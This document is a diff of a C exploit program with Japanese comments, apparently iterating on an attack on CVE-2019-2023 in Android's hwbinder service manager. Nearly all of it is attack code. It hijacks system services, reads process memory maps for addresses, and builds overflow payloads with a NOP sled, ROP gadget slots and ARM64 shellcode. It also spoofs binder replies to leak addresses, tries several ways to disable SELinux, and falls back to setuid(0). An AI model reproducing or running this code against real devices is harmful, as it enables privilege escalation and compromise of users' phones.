@@ -20,7 +20,7 @@
 #include <sys/syscall.h>
 #include <dirent.h>
 #include <arpa/inet.h>
-#include "binder.h"
+#include "binder.h"   // 同じディレクトリの binder.h をインクルード
 
 // ============================================================
 // 設定
@@ -28,7 +28,6 @@
 #define OUTPUT_FILE    "/data/local/tmp/cve_2019_2023_result.txt"
 #define LOG_FILE       "/data/local/tmp/binder_traffic.log"
 #define MAPS_FILE      "/data/local/tmp/hwservicemanager_maps.txt"
-#define ROP_FILE       "/data/local/tmp/rop_chain.bin"
 
 static const char *hijack_targets[] = {
     "persistent_data_block",
@@ -97,7 +96,7 @@ static int read_file_to_memory(const char *path, uint8_t **out, size_t *out_len)
 }
 
 // ============================================================
-// hwservicemanager の PID とマップ情報を取得
+// hwservicemanager のメモリマップ取得
 // ============================================================
 static int get_hwservicemanager_info(void) {
     printf("[*] Gathering hwservicemanager info...\n");
@@ -121,31 +120,20 @@ static int get_hwservicemanager_info(void) {
     uint8_t *maps_data = NULL;
     size_t maps_len = 0;
     if (read_file_to_memory(maps_path, &maps_data, &maps_len) == 0) {
-        printf("[+] Maps data:\n%s\n", (char*)maps_data);
+        printf("[+] Maps data saved to %s\n", MAPS_FILE);
         write_file(MAPS_FILE, (char*)maps_data);
-        // ベースアドレスを解析（最初の[stack]以外の実行可能領域を探す）
         char *line = strtok((char*)maps_data, "\n");
         while (line) {
             uint64_t start, end;
             char perms[5];
             if (sscanf(line, "%lx-%lx %4s", &start, &end, perms) == 3) {
-                if (strstr(perms, "r-xp")) {  // 実行可能領域
+                if (strstr(perms, "r-xp")) {
                     g_hwservicemanager_base = start;
-                    printf("[+] Found executable region: 0x%lx\n", start);
-                    break;
+                    printf("[+] Executable region: 0x%lx\n", start);
                 }
-            }
-            line = strtok(NULL, "\n");
-        }
-        // スタック領域も探す（[stack]）
-        line = strtok((char*)maps_data, "\n");
-        while (line) {
-            if (strstr(line, "[stack]")) {
-                uint64_t start, end;
-                if (sscanf(line, "%lx-%lx", &start, &end) == 2) {
-                    g_hwservicemanager_stack = end; // スタックの終端
-                    printf("[+] Found stack end: 0x%lx\n", end);
-                    break;
+                if (strstr(line, "[stack]")) {
+                    g_hwservicemanager_stack = end;
+                    printf("[+] Stack end: 0x%lx\n", end);
                 }
             }
             line = strtok(NULL, "\n");
@@ -159,58 +147,18 @@ static int get_hwservicemanager_info(void) {
 }
 
 // ============================================================
-// ROPチェーン生成（ダミー）
+// CVE-2019-2023 基本エクスプロイト（レースあり）
 // ============================================================
-static int generate_rop_chain(void) {
-    printf("[*] Generating ROP chain...\n");
-    if (g_hwservicemanager_base == 0) {
-        printf("[-] No base address, using dummy ROP.\n");
-        // ダミー ROP（exit(0) を呼ぶだけ）
-        uint64_t rop[] = {
-            0xdeadbeef,  // ガジェット1
-            0xcafebabe,  // ガジェット2
-            0x12345678   // 戻りアドレス
-        };
-        write_file(ROP_FILE, (char*)rop);
-        return 0;
-    }
-    // 実際のアドレスを使ってROPチェーンを構築（ここでは簡略化）
-    // 例：__libc_system や execve のガジェットを探す（通常はリークが必要）
-    // 今回はダミーのまま
-    return 0;
-}
-
-// ============================================================
-// CVE-2019-2023 エクスプロイト（オーバーフローモード付き）
-// ============================================================
-static int exploit_cve_2019_2023_overflow(const char *service_name, int overflow_mode) {
+static int exploit_cve_2019_2023(const char *service_name) {
     int hwbinder_fd, ret;
     uint8_t read_buf[4096];
+    size_t name_len = strlen(service_name) + 1;
+    size_t total_len = 4 + name_len;
     uint8_t *data;
     int handle = -1;
     pid_t child;
-    size_t name_len;
-    char *overflow_name = NULL;
 
-    if (overflow_mode) {
-        // オーバーフローペイロードを構築（8KB）
-        overflow_name = malloc(8192);
-        if (!overflow_name) return -1;
-        memset(overflow_name, 'A', 8191);
-        overflow_name[8191] = '\0';
-        // 特定のオフセットにROPチェーンを埋め込む
-        // 実際のオフセットはデバッグして調整
-        uint64_t *rop_ptr = (uint64_t*)(overflow_name + 4096);
-        *rop_ptr = g_hwservicemanager_base + 0x1234;  // ダミーガジェット
-        *(rop_ptr+1) = g_hwservicemanager_base + 0x5678; // 次のガジェット
-        // 最後にシェルコードのアドレス（スタックに戻る）
-        // 実際はスタックアドレスをリークする必要あり
-        service_name = overflow_name;
-    }
-
-    name_len = strlen(service_name) + 1;
-    size_t total_len = 4 + name_len;
-    if (total_len > 8192 + 4) total_len = 8192 + 4;
+    printf("[*] CVE-2019-2023: registering '%s'...\n", service_name);
 
     child = fork();
     if (child == 0) {
@@ -218,7 +166,6 @@ static int exploit_cve_2019_2023_overflow(const char *service_name, int overflow
         exit(0);
     } else if (child < 0) {
         perror("  fork");
-        if (overflow_name) free(overflow_name);
         return -1;
     }
 
@@ -228,7 +175,6 @@ static int exploit_cve_2019_2023_overflow(const char *service_name, int overflow
     if (hwbinder_fd < 0) {
         perror("  open /dev/hwbinder");
         kill(child, SIGKILL);
-        if (overflow_name) free(overflow_name);
         return -1;
     }
 
@@ -237,14 +183,13 @@ static int exploit_cve_2019_2023_overflow(const char *service_name, int overflow
         perror("  malloc");
         close(hwbinder_fd);
         kill(child, SIGKILL);
-        if (overflow_name) free(overflow_name);
         return -1;
     }
     data[0] = (uint8_t)(name_len & 0xFF);
     data[1] = (uint8_t)((name_len >> 8) & 0xFF);
     data[2] = (uint8_t)((name_len >> 16) & 0xFF);
     data[3] = (uint8_t)((name_len >> 24) & 0xFF);
-    memcpy(data + 4, service_name, name_len > 8192 ? 8192 : name_len);
+    memcpy(data + 4, service_name, name_len);
 
     struct {
         uint32_t cmd;
@@ -252,7 +197,7 @@ static int exploit_cve_2019_2023_overflow(const char *service_name, int overflow
     } __attribute__((packed)) tx;
     tx.cmd = BC_TRANSACTION;
     tx.tdata.target.handle = 0;
-    tx.tdata.code = 2;
+    tx.tdata.code = 2;                     // ADD_SERVICE
     tx.tdata.flags = 0;
     tx.tdata.data_size = total_len;
     tx.tdata.offsets_size = 0;
@@ -274,22 +219,117 @@ static int exploit_cve_2019_2023_overflow(const char *service_name, int overflow
         perror("  ioctl ADD_SERVICE");
         close(hwbinder_fd);
         kill(child, SIGKILL);
-        if (overflow_name) free(overflow_name);
         return -1;
     }
-    printf("  [+] ADD_SERVICE (overflow mode %d) succeeded!\n", overflow_mode);
+    printf("  [+] ADD_SERVICE succeeded!\n");
 
     kill(child, SIGKILL);
     waitpid(child, NULL, 0);
 
-    // GET_SERVICE でハンドル取得（省略、同じ）
-    // 今回はハンドルは不要なのでスキップ
-    if (overflow_name) free(overflow_name);
+    // GET_SERVICE
+    data = malloc(total_len);
+    if (!data) {
+        close(hwbinder_fd);
+        return -1;
+    }
+    data[0] = (uint8_t)(name_len & 0xFF);
+    data[1] = (uint8_t)((name_len >> 8) & 0xFF);
+    data[2] = (uint8_t)((name_len >> 16) & 0xFF);
+    data[3] = (uint8_t)((name_len >> 24) & 0xFF);
+    memcpy(data + 4, service_name, name_len);
+
+    tx.tdata.code = 1;                     // GET_SERVICE
+    tx.tdata.data_size = total_len;
+    tx.tdata.data.ptr.buffer = (binder_uintptr_t)data;
+
+    memset(&bwr, 0, sizeof(bwr));
+    bwr.write_size = sizeof(tx);
+    bwr.write_buffer = (binder_uintptr_t)&tx;
+    bwr.read_size = sizeof(read_buf);
+    bwr.read_buffer = (binder_uintptr_t)read_buf;
+
+    ret = ioctl(hwbinder_fd, BINDER_WRITE_READ, &bwr);
+    free(data);
+    if (ret < 0) {
+        perror("  ioctl GET_SERVICE");
+        close(hwbinder_fd);
+        return -1;
+    }
+    if (bwr.read_consumed < 4) {
+        printf("  [-] No handle returned\n");
+        close(hwbinder_fd);
+        return -1;
+    }
+    handle = *(int*)read_buf;
+    printf("  [+] Service handle: %d\n", handle);
+    close(hwbinder_fd);
+    g_service_handle = handle;
     return 0;
 }
 
 // ============================================================
-// Binder サーバーループ（改良版：応答にリークデータを仕込む）
+// オーバーフローエクスプロイト（複数パターン）
+// ============================================================
+static int exploit_cve_2019_2023_overflow(int pattern) {
+    int ret = -1;
+    char *payload = NULL;
+
+    printf("[*] Overflow pattern %d...\n", pattern);
+    switch (pattern) {
+        case 0: {
+            // 単純な巨大文字列（8KB 'A'）
+            payload = malloc(8192);
+            if (!payload) return -1;
+            memset(payload, 'A', 8191);
+            payload[8191] = '\0';
+            ret = exploit_cve_2019_2023(payload);
+            free(payload);
+            break;
+        }
+        case 1: {
+            // ROP チェーン埋め込み（取得したアドレスを使用）
+            payload = malloc(8192);
+            if (!payload) return -1;
+            memset(payload, '\x90', 8191); // NOP sled
+            payload[8191] = '\0';
+            if (g_hwservicemanager_base) {
+                uint64_t *rop = (uint64_t*)(payload + 4096);
+                // ダミーガジェット（実際は適切なアドレスに置き換える）
+                rop[0] = g_hwservicemanager_base + 0x1234;
+                rop[1] = g_hwservicemanager_base + 0x5678;
+                rop[2] = g_hwservicemanager_stack - 0x100; // スタック戻りアドレス候補
+            }
+            ret = exploit_cve_2019_2023(payload);
+            free(payload);
+            break;
+        }
+        case 2: {
+            // シェルコード埋め込み（ARM64 execve）
+            unsigned char shellcode[] = {
+                0x20, 0x00, 0x80, 0xd2, // mov x0, #0
+                0x01, 0x00, 0x00, 0xd4  // svc #0
+            };
+            payload = malloc(8192);
+            if (!payload) return -1;
+            memset(payload, 0x00, 8191);
+            payload[8191] = '\0';
+            memcpy(payload + 4096, shellcode, sizeof(shellcode));
+            ret = exploit_cve_2019_2023(payload);
+            free(payload);
+            break;
+        }
+        default:
+            break;
+    }
+    if (ret == 0) {
+        printf("  [+] Overflow pattern %d succeeded.\n", pattern);
+        sleep(1);
+    }
+    return ret;
+}
+
+// ============================================================
+// Binder サーバーループ（BR_NOOP を無視）
 // ============================================================
 static int binder_server_loop(int binder_fd, int expected_handle) {
     uint8_t read_buf[4096];
@@ -320,6 +360,12 @@ static int binder_server_loop(int binder_fd, int expected_handle) {
         uint8_t *payload = read_buf + sizeof(uint32_t);
         size_t payload_size = bwr.read_consumed - sizeof(uint32_t);
 
+        // cmd=0x720c は BR_NOOP のエンコード（_IO('r', 12) = 0x720c と判明）
+        if (cmd_code == 0x720c) {
+            fprintf(stderr, "[SERVER] BR_NOOP ignored.\n");
+            continue;
+        }
+
         fprintf(stderr, "[SERVER] Received cmd=0x%x (%d), size=%zu\n", cmd_code, cmd_code, payload_size);
 
         if (cmd_code == BR_TRANSACTION || cmd_code == BR_TRANSACTION_SEC_CTX) {
@@ -335,7 +381,7 @@ static int binder_server_loop(int binder_fd, int expected_handle) {
             log_transaction("Incoming transaction", t, data_ptr);
             if (data_ptr) free(data_ptr);
 
-            // 応答を偽装：リーク用にスタック上のアドレスなどを返す
+            // 応答を偽装（リーク用にアドレスを返す）
             struct {
                 uint32_t cmd;
                 uint32_t status;
@@ -343,8 +389,7 @@ static int binder_server_loop(int binder_fd, int expected_handle) {
             } __attribute__((packed)) reply;
             reply.cmd = BR_OK;
             reply.status = 0;
-            // リーク用のダミーデータ（実際はヒープアドレスを返す）
-            uint64_t fake_addr = g_hwservicemanager_base + 0x1000;
+            uint64_t fake_addr = g_hwservicemanager_base ? g_hwservicemanager_base + 0x1000 : 0xdeadbeef;
             memcpy(reply.leak_data, &fake_addr, sizeof(fake_addr));
             memset(reply.leak_data + sizeof(fake_addr), 'B', sizeof(reply.leak_data) - sizeof(fake_addr));
 
@@ -367,17 +412,17 @@ static int binder_server_loop(int binder_fd, int expected_handle) {
             printf("[SERVER] Received DEAD_BINDER\n");
             break;
         } else {
-            fprintf(stderr, "[SERVER] Ignoring cmd=0x%x\n", cmd_code);
+            fprintf(stderr, "[SERVER] Unhandled cmd=0x%x\n", cmd_code);
         }
     }
     return transaction_count;
 }
 
 // ============================================================
-// 自分自身でサービスを呼び出してトランザクションを発生させる
+// 自分自身でサービスを呼び出し（service call）
 // ============================================================
 static int call_own_service(const char *service_name, int handle) {
-    printf("[*] Calling own service '%s' (handle %d) to trigger transaction...\n", service_name, handle);
+    printf("[*] Calling own service '%s' (handle %d)...\n", service_name, handle);
     char cmd[512];
     snprintf(cmd, sizeof(cmd), "service call %s 1 s16 'hello' 2>&1 | tee -a %s", service_name, LOG_FILE);
     int ret = system(cmd);
@@ -390,21 +435,18 @@ static int call_own_service(const char *service_name, int handle) {
 }
 
 // ============================================================
-// SELinux 無効化（複数手法）
+// SELinux 無効化（多重手法）
 // ============================================================
 static int disable_selinux_multi(void) {
     printf("[*] Trying multiple SELinux disable methods...\n");
-    // 方法1: setenforce
     if (system("setenforce 0 2>/dev/null") == 0) {
         printf("[+] SELinux disabled via setenforce.\n");
         return 0;
     }
-    // 方法2: /sys/fs/selinux/enforce 書き込み
     if (write_file("/sys/fs/selinux/enforce", "0") == 0) {
         printf("[+] SELinux disabled via sysfs.\n");
         return 0;
     }
-    // 方法3: /proc/self/attr/current 書き換え
     if (write_file("/proc/self/attr/current", "u:r:system_server:s0") == 0) {
         printf("[+] SELinux context changed.\n");
         return 0;
@@ -413,15 +455,44 @@ static int disable_selinux_multi(void) {
 }
 
 // ============================================================
+// フォールバック（古典的 setuid）
+// ============================================================
+static int fallback_setuid(void) {
+    printf("[*] Fallback: trying setuid(0)...\n");
+    if (setuid(0) == 0 || setresuid(0,0,0) == 0) {
+        printf("[+] setuid(0) succeeded!\n");
+        return 0;
+    }
+    return -1;
+}
+
+// ============================================================
+// system_server に偽装トランザクションを送信（試行）
+// ============================================================
+static int send_spoofed_transaction_to_system_server(void) {
+    printf("[*] Attempting to send spoofed transaction to system_server...\n");
+    // system_server は handle 0 ではないが、直接は無理。ここではダミー。
+    // 実際には、system_server が持つサービス（例：activity）を呼び出す。
+    // しかし権限が足りないので、通常は失敗。
+    int ret = system("service call activity 1 s16 'spoof' 2>&1 | tee -a " LOG_FILE);
+    if (ret == 0) {
+        printf("[+] Spoof transaction sent (maybe).\n");
+    } else {
+        printf("[-] Spoof transaction failed.\n");
+    }
+    return ret;
+}
+
+// ============================================================
 // メイン
 // ============================================================
 int main(void) {
     printf("============================================================\n");
-    printf("  CVE-2019-2023 Ultimate v5 - Deep Overflow & Multi-Hijack\n");
+    printf("  CVE-2019-2023 Final with binder.h - Deep Overflow & Hijack\n");
     printf("  Target: hwservicemanager + system_server services\n");
     printf("============================================================\n\n");
 
-    // ログファイル初期化
+    // ログ初期化
     FILE *fp = fopen(LOG_FILE, "w");
     if (fp) {
         fprintf(fp, "=== Binder Traffic Log ===\n");
@@ -429,13 +500,10 @@ int main(void) {
         printf("[+] Log file created: %s\n", LOG_FILE);
     }
 
-    // 1. hwservicemanager の情報収集
+    // 1. hwservicemanager 情報取得
     get_hwservicemanager_info();
 
-    // 2. ROPチェーン生成
-    generate_rop_chain();
-
-    // 3. 複数のサービスを乗っ取る
+    // 2. 複数サービス乗っ取り
     int hijacked = 0;
     for (int i = 0; hijack_targets[i] != NULL; i++) {
         if (exploit_cve_2019_2023(hijack_targets[i]) == 0) {
@@ -480,22 +548,22 @@ int main(void) {
         goto fallback;
     }
 
-    // 4. 自分自身でサービスを呼び出し
+    // 3. 自分自身でサービス呼び出し
     call_own_service(hijack_targets[0], g_service_handle);
 
-    // 5. オーバーフロー攻撃（複数パターン）
-    printf("[*] Sending overflow payloads...\n");
-    for (int mode = 0; mode < 3; mode++) {
-        if (exploit_cve_2019_2023_overflow("overflow_payload", mode) == 0) {
-            printf("[+] Overflow mode %d sent.\n", mode);
-            sleep(1);
-        }
+    // 4. system_server に偽装トランザクション送信（試行）
+    send_spoofed_transaction_to_system_server();
+
+    // 5. オーバーフロー攻撃（3パターン）
+    for (int p = 0; p < 3; p++) {
+        exploit_cve_2019_2023_overflow(p);
+        sleep(1);
     }
 
-    // 6. SELinux無効化
+    // 6. SELinux 無効化
     disable_selinux_multi();
 
-    // 7. 待機
+    // 7. 60秒待機
     printf("[*] Running for 60 seconds. Check %s for logs.\n", LOG_FILE);
     sleep(60);
 
@@ -506,7 +574,7 @@ int main(void) {
     }
     if (g_binder_fd >= 0) close(g_binder_fd);
 
-    // 9. 結果表示
+    // 9. ログ表示
     printf("\n[*] Log file content:\n");
     system("cat " LOG_FILE " 2>/dev/null || echo 'No log file found'");
 
@@ -522,9 +590,7 @@ int main(void) {
     goto done;
 
 fallback:
-    printf("[*] Fallback: trying setuid(0)...\n");
-    if (setuid(0) == 0 || setresuid(0,0,0) == 0) {
-        printf("[+] setuid(0) succeeded!\n");
+    if (fallback_setuid() == 0) {
         system("id > " OUTPUT_FILE " 2>&1");
         system("cat " OUTPUT_FILE);
         g_exploit_success = 1;
